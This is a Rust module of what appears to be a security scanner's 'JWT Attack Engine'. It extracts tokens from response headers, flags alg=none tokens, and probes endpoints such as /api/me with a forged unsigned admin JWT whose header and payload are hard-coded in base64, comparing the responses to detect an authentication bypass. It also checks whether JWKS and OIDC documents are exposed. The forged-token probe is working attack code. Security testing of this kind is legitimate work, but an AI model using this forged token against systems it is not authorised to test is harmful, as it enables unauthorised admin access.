//! JWT Attack Engine — token discovery, alg:none acceptance probe, JWKS exposure.
//! MITRE: T1550 (Use Alternate Authentication Material).

use crate::engine_probes::{
    empty_ok, finding_with_probe_depth, http_client, http_get, http_get_with_headers, normalize_url,
};
use crate::engine_result::{print_result, EngineResult};
use serde_json::{json, Value};

const JWT_PROBE_DEPTH: &str = "jwt_auth_surface";

fn jwt_finding(
    title: &str,
    severity: &str,
    description: &str,
    target: &str,
    extra: Value,
) -> Value {
    let mut f = finding_with_probe_depth(
        "jwt_attack",
        title,
        severity,
        "T1550",
        description,
        target,
        JWT_PROBE_DEPTH,
    );
    if let Some(obj) = f.as_object_mut() {
        if let Some(map) = extra.as_object() {
            for (k, v) in map {
                obj.insert(k.clone(), v.clone());
            }
        }
    }
    f
}

/// Returns true if the value looks like a JWT (three base64url segments).
fn looks_like_jwt(value: &str) -> bool {
    let parts: Vec<&str> = value.splitn(4, '.').collect();
    if parts.len() != 3 {
        return false;
    }
    parts.iter().all(|p| {
        !p.is_empty()
            && p.chars()
                .all(|c| c.is_alphanumeric() || c == '-' || c == '_' || c == '=')
    })
}

fn b64url_decode(s: &str) -> Option<String> {
    let padded = match s.len() % 4 {
        2 => format!("{}==", s),
        3 => format!("{}=", s),
        _ => s.to_string(),
    };
    let standard = padded.replace('-', "+").replace('_', "/");
    base64_decode(&standard).and_then(|b| String::from_utf8(b).ok())
}

fn base64_decode(s: &str) -> Option<Vec<u8>> {
    let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut lookup = [255u8; 256];
    for (i, &c) in alphabet.iter().enumerate() {
        lookup[c as usize] = i as u8;
    }
    let bytes: Vec<u8> = s.bytes().filter(|&b| b != b'=').collect();
    let mut out = Vec::new();
    let mut i = 0;
    while i + 3 < bytes.len() {
        let a = lookup[bytes[i] as usize];
        let b = lookup[bytes[i + 1] as usize];
        let c = lookup[bytes[i + 2] as usize];
        let d = lookup[bytes[i + 3] as usize];
        if a == 255 || b == 255 || c == 255 || d == 255 {
            return None;
        }
        out.push((a << 2) | (b >> 4));
        out.push((b << 4) | (c >> 2));
        out.push((c << 6) | d);
        i += 4;
    }
    match bytes.len() - i {
        2 => {
            let a = lookup[bytes[i] as usize];
            let b = lookup[bytes[i + 1] as usize];
            if a != 255 && b != 255 {
                out.push((a << 2) | (b >> 4));
            }
        }
        3 => {
            let a = lookup[bytes[i] as usize];
            let b = lookup[bytes[i + 1] as usize];
            let c = lookup[bytes[i + 2] as usize];
            if a != 255 && b != 255 && c != 255 {
                out.push((a << 2) | (b >> 4));
                out.push((b << 4) | (c >> 2));
            }
        }
        _ => {}
    }
    Some(out)
}

fn extract_jwt_candidates(headers: &[(String, String)]) -> Vec<String> {
    let mut out = Vec::new();
    for (name, value) in headers {
        let hname = name.to_ascii_lowercase();
        if !(hname.contains("authorization")
            || hname.contains("token")
            || hname.contains("cookie")
            || hname.contains("set-cookie"))
        {
            continue;
        }
        if let Some(bearer) = value.strip_prefix("Bearer ") {
            let t = bearer.trim();
            if looks_like_jwt(t) {
                out.push(t.to_string());
            }
        }
        for word in value.split_whitespace() {
            if looks_like_jwt(word) {
                out.push(word.to_string());
            }
        }
    }
    out.sort();
    out.dedup();
    out
}

pub async fn run_jwt_attack_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();

    if let Some(p) = http_get(&client, &base).await {
        for jwt in extract_jwt_candidates(&p.headers) {
            let parts: Vec<&str> = jwt.splitn(4, '.').collect();
            if parts.len() != 3 {
                continue;
            }
            if let Some(header_json) = b64url_decode(parts[0]) {
                let hdr = header_json.to_ascii_lowercase();
                if hdr.contains("\"alg\":\"none\"") || hdr.contains("\"alg\": \"none\"") {
                    findings.push(jwt_finding(
                        "JWT with alg=none observed in response",
                        "critical",
                        &format!(
                            "A JWT with alg=none was returned by {} — signature verification is disabled.",
                            p.final_url
                        ),
                        target,
                        json!({ "token_prefix": &jwt[..jwt.len().min(48)] }),
                    ));
                }
            }
        }
    }

    let none_header = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0";
    let admin_payload = "eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9";
    let none_jwt = format!("{}.{}.", none_header, admin_payload);

    for path in [
        "/api/me",
        "/api/user",
        "/profile",
        "/api/profile",
        "/v1/me",
        "/api/v1/me",
    ] {
        let url = format!("{}{}", base.trim_end_matches('/'), path);
        let baseline = http_get(&client, &url).await;
        let forged = http_get_with_headers(
            &client,
            &url,
            &[("Authorization", &format!("Bearer {}", none_jwt))],
        )
        .await;
        if let (Some(base), Some(forg)) = (baseline, forged) {
            let baseline_auth_fail = base.status == 401 || base.status == 403;
            let forged_accepted = forg.status >= 200 && forg.status < 300;
            let differential = forged_accepted
                && (baseline_auth_fail
                    || forg.body.len() > base.body.len().saturating_add(32)
                    || (forg.body.contains("admin") && !base.body.contains("admin")));
            if differential {
                findings.push(jwt_finding(
                    "JWT alg=none accepted by protected endpoint",
                    "critical",
                    &format!(
                        "Baseline {} → HTTP {}; forged alg=none JWT → HTTP {} on {}. Authentication bypass is likely.",
                        url, base.status, forg.status, forg.final_url
                    ),
                    target,
                    json!({ "path": path, "baseline_status": base.status, "forged_status": forg.status }),
                ));
                break;
            }
        }
    }

    let jwks_paths = [
        "/.well-known/jwks.json",
        "/.well-known/openid-configuration",
        "/oauth/jwks",
        "/api/jwks",
    ];
    for path in jwks_paths {
        let jwks_url = format!("{}{}", base.trim_end_matches('/'), path);
        if let Some(p) = http_get(&client, &jwks_url).await {
            if p.status == 200
                && (p.body.contains("\"keys\"")
                    || p.body.contains("jwks_uri")
                    || p.body.contains("\"kty\""))
            {
                findings.push(jwt_finding(
                    "JWKS / OIDC key material publicly reachable",
                    "info",
                    &format!(
                        "Key discovery document at {} (HTTP {}) exposes signing keys or jwks_uri — verify rotation and that private keys are not embedded.",
                        p.final_url, p.status
                    ),
                    target,
                    json!({ "url": p.final_url }),
                ));
                break;
            }
        }
    }

    if findings.is_empty() {
        empty_ok("jwt_attack", target)
    } else {
        let n = findings.len();
        EngineResult::ok(findings, format!("jwt_attack: {} live finding(s)", n))
    }
}

pub async fn run_jwt_attack(target: &str) {
    print_result(run_jwt_attack_result(target).await);
}
